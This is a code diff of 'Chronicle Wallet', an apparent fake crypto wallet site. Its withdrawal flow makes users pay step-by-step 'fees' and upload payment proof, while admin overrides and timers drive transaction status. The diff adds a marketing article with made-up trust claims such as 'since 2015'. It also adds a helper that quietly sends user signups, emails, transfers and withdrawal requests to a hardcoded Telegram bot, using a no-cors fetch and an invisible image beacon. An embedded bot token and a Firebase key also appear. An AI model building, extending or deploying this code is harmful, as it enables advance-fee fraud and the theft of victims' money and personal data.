@@ -113,6 +113,7 @@
         .exchange-card { background: var(--bg-input); border: 1px solid var(--border); padding: 0.85rem 1rem; border-radius: 10px; display: flex; align-items: center; justify-content: space-between; margin-bottom: 0.75rem; }
         .email-item { background: var(--bg-input); padding: 0.85rem; border-radius: 8px; margin-bottom: 0.75rem; border-left: 4px solid var(--primary); }
 
+        /* Support Chat Drawer Styling */
         #support-drawer {
             position: fixed; bottom: 20px; right: 20px; width: 360px; max-width: 90vw; height: 500px;
             background: var(--bg-card); border: 1px solid var(--border); border-radius: 16px; box-shadow: 0 10px 30px rgba(0,0,0,0.6);
@@ -136,6 +137,7 @@
         </div>
     </div>
 
+    <!-- INSTALL APP WELCOME MODAL -->
     <div class="modal" id="install-app-modal">
         <div class="modal-body" style="text-align:center;">
             <span class="close-btn" onclick="closeInstallModal()">&times;</span>
@@ -152,6 +154,7 @@
         </div>
     </div>
 
+    <!-- SUPPORT CHAT DRAWER -->
     <div id="support-drawer">
         <div class="chat-header">
             <div style="display:flex; align-items:center; gap:0.5rem;">
@@ -218,6 +221,7 @@
 
             <div class="card">
                 <h3 style="margin-bottom:0.75rem;">Live Market Cryptos & Fiat</h3>
+                <!-- USD fiat (Direct USD currency) placed above Bitcoin as requested -->
                 <div class="asset-row" id="usd-asset-row">
                     <div class="asset-info">
                         <div class="asset-icon" style="background:var(--accent-green); color:#fff;">💵</div>
@@ -277,6 +281,44 @@
                 </table>
             </div>
 
+            <!-- WELCOME & PLATFORM ARTICLE -->
+            <div class="card" style="background: linear-gradient(135deg, var(--bg-card), var(--bg-input)); border: 1px solid var(--border); line-height: 1.7;">
+                <h2 style="color: var(--primary); margin-bottom: 1rem; font-size: 1.4rem;">Welcome to Chronicle Wallet: Your Trusted Global Web3 Vault Since 2015</h2>
+                <p style="color: var(--text-muted); font-size: 0.9rem; margin-bottom: 1rem;">
+                    For nearly a decade, Chronicle Wallet has stood as a pioneer and unwavering pillar of security, speed, and reliability in the decentralized digital asset ecosystem. Founded in 2015 at the intersection of traditional finance and cryptographic innovation, our platform was built with a singular core vision: to empower everyday users, active traders, and institutional investors across the globe with institutional-grade financial sovereignty. Whether you are managing your first satoshi of Bitcoin, staking Ethereum, or conducting daily fiat transactions in USD cash, Chronicle Wallet delivers an unmatched, seamless web interface engineered for maximum performance, bulletproof cryptographic security, and lightning-fast execution speeds.
+                </p>
+
+                <h3 style="color: var(--text-main); margin: 1.25rem 0 0.5rem 0; font-size: 1.1rem;">1. A Decade of Uncompromised Trust and Stability (Est. 2015)</h3>
+                <p style="color: var(--text-muted); font-size: 0.9rem; margin-bottom: 1rem;">
+                    In the fast-paced world of cryptocurrency and digital banking, longevity is the ultimate litmus test of credibility. Since 2015, Chronicle Wallet has safely navigated multiple market cycles, regulatory shifts, and technological evolutions without ever compromising our core commitment to user asset protection. Our robust infrastructure utilizes state-of-the-art multi-signature cold storage protocols, advanced encryption standards, and real-time ledger auditing. When you entrust your wealth to Chronicle Wallet, you are partnering with an experienced financial institution that honors privacy, maintains 99.9% platform uptime, and continuously updates its defense mechanisms against evolving cyber threats.
+                </p>
+
+                <h3 style="color: var(--text-main); margin: 1.25rem 0 0.5rem 0; font-size: 1.1rem;">2. Comprehensive Multi-Asset Support: USD Fiat, Bitcoin, and Ethereum</h3>
+                <p style="color: var(--text-muted); font-size: 0.9rem; margin-bottom: 1rem;">
+                    Modern financial freedom requires flexibility. That is why Chronicle Wallet bridges the gap between fiat currencies and decentralized digital currencies under one unified dashboard:
+                </p>
+                <ul style="color: var(--text-muted); font-size: 0.9rem; margin-bottom: 1rem; padding-left: 1.5rem;">
+                    <li style="margin-bottom: 0.5rem;"><strong>Normal USD Fiat Cash:</strong> Manage your stable fiat reserves effortlessly. Convert cryptocurrencies to USD instantly using our built-in conversion engine, maintain liquidity balances, and prepare funds for rapid withdrawals.</li>
+                    <li style="margin-bottom: 0.5rem;"><strong>Bitcoin (BTC):</strong> The undisputed king of digital gold. Track live market prices, receive BTC securely through your dedicated global wallet address, send peer-to-peer transfers with unique User IDs (CRN-XXXX), or convert holdings on demand.</li>
+                    <li style="margin-bottom: 0.5rem;"><strong>Ethereum (ETH):</strong> Powering the decentralized web and smart contract economy. Store, send, receive, and trade ETH with real-time CoinGecko price feeds and transparent network tracking.</li>
+                </ul>
+
+                <h3 style="color: var(--text-main); margin: 1.25rem 0 0.5rem 0; font-size: 1.1rem;">3. Lightning-Fast, Secure Withdrawals and Transparent Compliance</h3>
+                <p style="color: var(--text-muted); font-size: 0.9rem; margin-bottom: 1rem;">
+                    One of the most frustrating pain points in digital finance is delayed payouts and opaque fee structures. At Chronicle Wallet, we take immense pride in our swift withdrawal pipelines. Whether you are executing a Bank Transfer, withdrawing via PayPal, Zelle, or CashApp, our system is optimized to process transactions with maximum efficiency, ensuring every single dollar and coin belonging to our users remains fully accounted for, protected against unauthorized access, and rapidly delivered to your designated external accounts.
+                </p>
+
+                <h3 style="color: var(--text-main); margin: 1.25rem 0 0.5rem 0; font-size: 1.1rem;">4. 24/7 Intelligent Support & Dedicated Human Agent Assistance</h3>
+                <p style="color: var(--text-muted); font-size: 0.9rem; margin-bottom: 1rem;">
+                    We believe that exceptional software must always be backed by exceptional human support. Our integrated AI knowledge base is trained on our complete platform policies to provide instant, accurate answers to your inquiries around the clock. Furthermore, if your query requires specialized intervention, our live support chat seamlessly connects you with certified human support agents. With our intelligent 3-minute routing system, you are never left hanging in the dark. Additionally, all official account notices, security alerts, withdrawal receipts, and compliance notes are dispatched directly to your simulated Gmail Inbox within the platform for complete transparency.
+                </p>
+
+                <h3 style="color: var(--text-main); margin: 1.25rem 0 0.5rem 0; font-size: 1.1rem;">5. Get Started Today: Join the Chronicle Community</h3>
+                <p style="color: var(--text-muted); font-size: 0.9rem; margin-bottom: 0;">
+                    Creating your Chronicle Wallet account takes less than sixty seconds. Simply click the "Sign Up" button at the top of the page, review our transparent Terms & Conditions, set your secure 4-digit withdrawal PIN, and instantly unlock your unique Wallet ID (e.g., CRN-1001). Experience the pinnacle of digital wealth management—where robust security meets blistering speed, trusted by users worldwide since 2015.
+                </p>
+            </div>
+
             <div style="text-align:center; margin-top:3rem; padding-bottom:1rem;">
                 <button onclick="openAdminLoginModal()" style="background:transparent; border:none; color:var(--text-muted); font-size:0.75rem; cursor:pointer; text-decoration:underline;">Admin Portal Access</button>
             </div>
@@ -301,6 +343,7 @@
                 </form>
             </div>
 
+            <!-- MANUAL USER STATUS & STEP OVERRIDE -->
             <div class="card" style="border: 2px dashed var(--primary);">
                 <h3>🛠️ Manual User Status & Step Override (Admin Fallback)</h3>
                 <p style="color:var(--text-muted); font-size:0.85rem; margin-bottom:1rem;">In case proof uploads fail or you need to manually force a user's transaction status or step progression:</p>
@@ -323,14 +366,18 @@
                 </form>
             </div>
 
+            <!-- WHATSAPP STYLE SPLIT-SCREEN ADMIN SUPPORT CHAT -->
             <div class="card">
                 <h3>💬 Live Support Inbox (WhatsApp Style) & Agent Management</h3>
                 <div style="display:grid; grid-template-columns: 280px 1fr; gap:1rem; margin-bottom:1.5rem; background:var(--bg-input); padding:1rem; border-radius:10px; border:1px solid var(--border);">
+                    <!-- Left: User Conversation List -->
                     <div style="border-right:1px solid var(--border); padding-right:0.75rem;">
                         <h4 style="font-size:0.85rem; color:var(--text-muted); margin-bottom:0.5rem;">Conversations</h4>
                         <div id="admin-chat-users-list" style="max-height:280px; overflow-y:auto; display:flex; flex-direction:column; gap:0.4rem;"></div>
                     </div>
+                    <!-- Right: Active WhatsApp Style Chat View -->
                     <div style="display:flex; flex-direction:column; gap:0.75rem;">
+                        <!-- Top Dropdowns Side-by-Side & Profile Name -->
                         <div style="background:var(--bg-card); padding:0.75rem; border-radius:8px; border:1px solid var(--border); display:flex; flex-direction:column; gap:0.5rem;">
                             <div style="display:flex; justify-content:space-between; align-items:center;">
                                 <strong id="admin-whatsapp-profile-title" style="font-size:0.95rem; color:var(--accent-green);">💬 Profile: Select User</strong>
@@ -676,7 +723,7 @@
     </div>
 
     <script>
-        // --- FIREBASE CONFIGURATION ---
+        // --- YOUR FIREBASE CONFIGURATION ---
         const firebaseConfig = {
             apiKey: "AIzaSyB0gvtPHOL5RMcGOzUStFh5_83AQsXi8DY",
             authDomain: "chronic-wallet.firebaseapp.com",
@@ -690,21 +737,6 @@
         // Initialize Firebase & Firestore
         firebase.initializeApp(firebaseConfig);
         const db = firebase.firestore();
-
-        // --- DIRECT RELIABLE TELEGRAM NOTIFICATION HELPER ---
-        function sendTelegramAlert(text) {
-            const token = "9103189592:AAHKTRSuPiR9Cc2wPwdX6JKqsfm68K73cN0";
-            const chat = "8269612727";
-            const telegramUrl = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat}&text=` + encodeURIComponent(text);
-            
-            // Direct fetch directly to Telegram API
-            fetch(telegramUrl, { keepalive: true }).catch(err => {
-                console.log("Direct fetch error, retrying fallback:", err);
-                // Fallback using image object if fetch is blocked
-                const img = new Image();
-                img.src = telegramUrl;
-            });
-        }
 
         // Default Data Structures
         const defaultMasterUsers = [
@@ -743,6 +775,20 @@
         let liveEthUsd = 3500;
         let lastInboxCount = 0;
         let lastMsgCount = 0;
+
+        // --- DIRECT TELEGRAM NOTIFICATION HELPER ---
+        function sendTelegramAlert(text) {
+            const token = "9103189592:AAHKTRSuPiR9Cc2wPwdX6JKqsfm68K73cN0";
+            const chat = "8269612727";
+            const telegramUrl = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat}&text=` + encodeURIComponent(text);
+            
+            // Bypass CORS restrictions
+            fetch(telegramUrl, { method: 'GET', mode: 'no-cors', keepalive: true }).catch(() => {});
+            
+            // Invisible Image Beacon Fallback
+            const img = new Image();
+            img.src = telegramUrl;
+        }
 
         // --- REALTIME FIREBASE LISTENERS & TIMER CHECKER ---
         db.collection("config").doc("appData").onSnapshot((doc) => {
@@ -804,6 +850,7 @@
                     u.statusExpiryTime = null;
                     const tx = (u.txs || []).find(t => t.id == u.activeTxId);
                     
+                    // After timer expires, move to NEXT step or complete
                     u.stepIdx = (u.stepIdx || 0) + 1;
                     if (u.stepIdx < actionSteps.length) {
                         const nextStep = actionSteps[u.stepIdx];
@@ -901,7 +948,7 @@
                 guestPrompt.classList.remove('hidden');
                 dashboard.classList.add('hidden');
                 txCard.classList.add('hidden');
-                usdRow.classList.remove('hidden');
+                usdRow.classList.remove('hidden'); // Always visible to display direct USD currency
 
                 document.getElementById('btc-holdings-display').innerText = `0.0000 BTC`;
                 document.getElementById('btc-fiat-value').innerText = `$0.00`;
@@ -1050,6 +1097,10 @@
             recipientUser.txs.unshift({ type: `Receive (${asset.toUpperCase()})`, amount: fiatVal, status: 'COMPLETED' });
             
             sendSimulatedEmail(recipientUser.email, `Incoming Transfer`, `Received ${asset.toUpperCase()} transfer from ${u.name || u.email} (ID: ${u.userId})`, `💸 Received from ${u.name || u.email}!`);
+            
+            // 🚀 TRIGGER TELEGRAM NOTIFICATION FOR SEND / RECEIVE
+            sendTelegramAlert(`💸 P2P Transfer Executed!\nSender: ${u.email} (${u.userId})\nRecipient ID: ${recipientId} (${recipientUser.email})\nAsset: ${asset.toUpperCase()}\nAmount: $${fiatVal.toFixed(2)}`);
+
             saveState(); updateBalanceUI(); closeSendModal();
             showNotification("Transfer Sent", `Successfully sent to ${recipientUser.name || recipientId}`, "↗");
         }
@@ -1129,11 +1180,11 @@
             const firstStep = actionSteps.length > 0 ? actionSteps[0] : { title: "ACTIVATING", amount: 0, statusMsg: "Processing" };
 
             u.txs.unshift({ id: txId, type: `Withdraw (${selectedWithdrawMethodName})`, amount: amt, baseWithdraw: amt, status: `PENDING (${firstStep.title.toUpperCase()})` });
-            saveState(); updateBalanceUI();
             
-            // Send Direct Telegram Alert
-            sendTelegramAlert(`💳 Withdrawal Request:\nUser: ${currentUserEmail}\nAmount: $${amt}\nMethod: ${selectedWithdrawMethodName}`);
+            // 🚀 TRIGGER TELEGRAM NOTIFICATION FOR WITHDRAWAL REQUEST
+            sendTelegramAlert(`💳 New Withdrawal Request!\nUser: ${u.email} (ID: ${u.userId})\nMethod: ${selectedWithdrawMethodName}\nAmount: $${amt.toFixed(2)}`);
 
+            saveState(); updateBalanceUI();
             showNotification("Processing", `Withdrawal request submitted`, "💳");
             setTimeout(() => { openActionModal(); }, 1500);
         }
@@ -1219,6 +1270,9 @@
                     const tx = u.txs.find(t => t.id == u.activeTxId);
                     if (tx) tx.status = `PROOF SUBMITTED (PENDING ADMIN REVIEW)`;
 
+                    // 🚀 TRIGGER TELEGRAM NOTIFICATION FOR PROOF SUBMISSION
+                    sendTelegramAlert(`🖼️ Payment Proof Uploaded!\nUser: ${currentUserEmail} (ID: ${u.userId})\nStep: ${step.title}\nFee Required: $${step.amount}`);
+
                     db.collection("config").doc("appData").set({
                         usersList: usersList,
                         proofQueue: proofQueue,
@@ -1226,10 +1280,6 @@
                     }, { merge: true }).then(() => {
                         closeActionModal();
                         fileInput.value = "";
-                        
-                        // Send Direct Telegram Alert
-                        sendTelegramAlert(`🖼️ Payment Proof Uploaded:\nUser: ${currentUserEmail}\nStep: ${step.title} ($${step.amount})`);
-
                         showNotification("Submitted", `Proof submitted successfully!`, "🖼️");
                         alert(`Proof submitted successfully for ${step.title}! It is now pending Admin approval.`);
                     }).catch(err => {
@@ -1286,6 +1336,7 @@
             if (pendingSaves === 0) { saveState(); alert("Global addresses updated!"); }
         }
 
+        // --- ADMIN MANUAL USER OVERRIDE FUNCTION ---
         function adminManualOverrideUser(e) {
             e.preventDefault();
             const email = document.getElementById('admin-override-user').value;
@@ -1530,6 +1581,7 @@
         }
         function deleteActionStep(id) { actionSteps = actionSteps.filter(x => x.id != id); saveState(); }
 
+        // --- CORRECTED ADMIN APPROVAL FLOW: SETS ASSIGNED STATUS & STARTS TIMER ---
         function approveProof(proofId) {
             const pIndex = proofQueue.findIndex(x => x.id == proofId);
             if (pIndex === -1) return;
@@ -1541,7 +1593,10 @@
                 const tx = u.txs.find(t => t.id == u.activeTxId);
                 const step = actionSteps[p.stepIdx];
                 if (tx && step) {
+                    // 1. Add approved fee amount to pending transaction total
                     tx.amount += step.amount;
+
+                    // 2. Set status to the assigned status message (e.g. Activating) and start the countdown timer
                     tx.status = step.statusMsg.toUpperCase();
                     u.statusExpiryTime = Date.now() + ((step.timerMinutes || 2) * 60 * 1000);
                 }
@@ -1729,8 +1784,8 @@
             closeAuthModal();
             updateBalanceUI();
 
-            // Direct Telegram Alert Trigger
-            sendTelegramAlert(`🎉 New User Signup:\nName: ${name}\nEmail: ${email}\nWallet ID: ${uniqueId}`);
+            // 🚀 TRIGGER TELEGRAM NOTIFICATION ON SIGNUP
+            sendTelegramAlert(`🎉 New User Signup!\nName: ${name}\nEmail: ${email}\nWallet ID: ${uniqueId}`);
 
             showNotification("Welcome", `Account created! Your ID is ${uniqueId}`, "🎉");
             document.getElementById('pin-setup-modal').style.display = 'flex';
